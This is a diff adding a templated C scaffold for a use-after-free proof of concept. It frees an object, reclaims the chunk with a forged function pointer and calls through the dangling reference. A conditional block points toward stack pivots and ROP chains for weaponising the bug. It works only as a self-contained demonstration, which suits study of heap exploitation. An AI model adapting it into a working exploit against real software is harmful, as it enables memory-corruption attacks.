@@ -1,0 +1,52 @@
+/*
+ * Use-after-free PoC scaffold — {{arch}}
+ * vuln: {{vuln}}
+ *
+ * Build:
+ *   {{#if asan}}cc -g -O0 -fsanitize=address -o uaf uaf.c   # ASAN pinpoints the UAF{{else}}cc -g -O0 -o uaf uaf.c{{/if}}
+ *
+ * Goal: free an object, then reclaim its chunk with attacker-controlled data
+ * before the dangling reference is used. Verify allocator (glibc/tcmalloc/
+ * kernel SLUB) and object size — heap layout is allocator-specific.
+ */
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+
+/* TODO: model the real victim object. SIZE_TODO must match the target so the
+ * reclaim lands in the same allocator bin/cache. */
+typedef struct victim {
+    void (*handler)(struct victim *);  /* a function pointer is a common target */
+    char  name[32];
+} victim_t;
+
+static void legit_handler(victim_t *v) { printf("legit: %s\n", v->name); }
+static void pwned(victim_t *v) { (void)v; puts("[+] control-flow hijack reached"); }
+
+int main(void) {
+    victim_t *v = malloc(sizeof(*v));     /* SIZE_TODO: confirm sizeof(victim) */
+    v->handler = legit_handler;
+    strcpy(v->name, "object-A");
+
+    /* (1) FREE — the dangling reference `v` survives. */
+    free(v);
+
+    /* (2) RErECLAIM — allocate same-size chunk; on glibc tcache/fastbin this
+     *     typically returns the just-freed chunk. Spray with controlled bytes. */
+    victim_t *spray = malloc(sizeof(*v));  /* expect spray == v */
+    spray->handler = pwned;                /* HANDLER_TODO: real target addr */
+    memset(spray->name, 'C', sizeof(spray->name) - 1);
+    spray->name[sizeof(spray->name) - 1] = 0;
+
+    fprintf(stderr, "[uaf] v=%p spray=%p %s\n", (void*)v, (void*)spray,
+            v == spray ? "(reclaimed)" : "(layout differs — adjust grooming)");
+
+    /* (3) USE-AFTER-FREE — dangling `v` now points at attacker data. */
+    v->handler(v);
+{{#if unsafe}}
+    /* WEAPONIZE_TODO (--unsafe): point handler at a stack pivot / one-gadget
+     * once you have a leak; build the ROP frame the pivot lands on. */
+{{/if}}
+    return 0;
+}
